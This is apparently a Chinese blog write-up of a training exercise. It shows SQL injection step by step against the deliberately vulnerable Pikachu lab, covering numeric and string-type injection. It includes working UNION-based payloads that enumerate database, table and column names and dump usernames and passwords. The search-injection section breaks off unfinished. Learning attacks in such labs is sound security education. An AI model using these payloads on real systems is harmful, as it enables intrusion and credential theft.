---
layout:     post
title:      TimeLineSec安全教程（一）————SQL注入
subtitle:   记录做靶机的过程和过程中的积累
date:       2020-02-24
author:     Ultimater
header-img: img/post-bg-20191109.jpg
catalog: true
tags:
    - 网络安全
    - TimeLine Sec
---

>**感谢 TimeLine Sec 组织的此次基础教程实验，帮助众多安全人员巩固基础和提升技能，尤其对我这样的入门者，更是一个从理论向实践发展的好的契机！同时，MS08067安全实验室出版的《Web安全攻防——渗透测试实验指南》作为我实验过程中用来随时随地加深理论认知的书籍，内容详实清晰，循序渐进，起到了巨大的作用，特此感谢！**

### 一、前言

SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。SQL注入按照不同的分类方法可以分为很多种，如报错注入、盲注、Union联合注入等。

本次 TimeLine Sec 的SQL注入实验靶机为 pikachu ，该靶场涉及到很多漏洞种类，感兴趣的可以自行在本地搭建练习，详情见[Pikachu搭建教程](https://mp.weixin.qq.com/s/z87ddIq79BlwSXNt0cMF2w)

### 二、数字型注入

![20200304212847.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304212847.png)

1.页面抓包之后，在参数`id`处输入`1'`判断是否存在注入

![1.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/1.png)

2.根据`1' and 1=1`和`1' and 1=2`的返回信息判断是数字型注入

![20200304214711.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304214711.png)

![2.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/2.png)

3.`order by 3`判断列数

![3.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/3.png)

4.用union联合注入，`id=-1 union select 1,2`判断输出位置（此时union的前一个条件为假）

![4.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/4.png)

5.union注入获取数据库`id=-1 union select database(),2`

![9O@V5@SSFXIVTWL%`LE}@2Y.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/9O%40V5%40SSFXIVTWL%25%60LE%7D%402Y.png)

6.构造语句爆表名
`id=-1 union select (select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),2`

![20200304215417.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304215417.png)

7.构造语句爆列名
`id=-1 union select (select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 1,1),2`

![A400U3PIJ6975{7C53L3Q18.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/A400U3PIJ6975%7B7C53L3Q18.png)

8.获取用户名
`id=-1 union select (select group_concat(username) from pikachu.users),2`

![20200304215626.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304215626.png)

9.获取用户密码`id=-1 union select (select group_concat(password) from pikachu.users),2`

![5.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/5.png)

### 三、字符型注入

1.输入`1'`报错，输入`1'#`页面返回正常，可判断为字符型注入

![6.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/6.png)

![5CT7PD3B@G_B7R_]~11YDT9.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/5CT7PD3B%40G_B7R_%5D%7E11YDT9.png)

2.判断列数`1' order by 3#`

![%VMWURQ14B{0(PTG9UY7D0J.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/%25VMWURQ14B%7B0(PTG9UY7D0J.png)

3.查看union注入返回到页面的位置`-1' union select 1,2#`

![7.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/7.png)

4.爆库名`-1' union select database(),2#`

![DWB~PHC20E)YPPYZO{4G]{V.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/DWB%7EPHC20E)YPPYZO%7B4G%5D%7BV.png)

5.爆表名`-1' union select (select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),2#`

![LTIEN1IOOH%PH}3MZS~%XXP.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/LTIEN1IOOH%25PH%7D3MZS%7E%25XXP.png)

6.爆user表中的列名`-1' union select (select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),2#`

![QQ图片20200305105055.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305105055.png)

7.爆user表的username字段`-1' union select (select group_concat(username) from pikachu.users),2#`

![QQ图片20200305105434.jpg](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305105434.jpg)

8.爆user表中的password字段`-1' union select (select group_concat(password) from pikachu.users),2#`

![OCU8XSUO3Q0]SV2LX]WYBP1.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/OCU8XSUO3Q0%5DSV2LX%5DWYBP1.png)

### 四、搜索型注入

1.















































































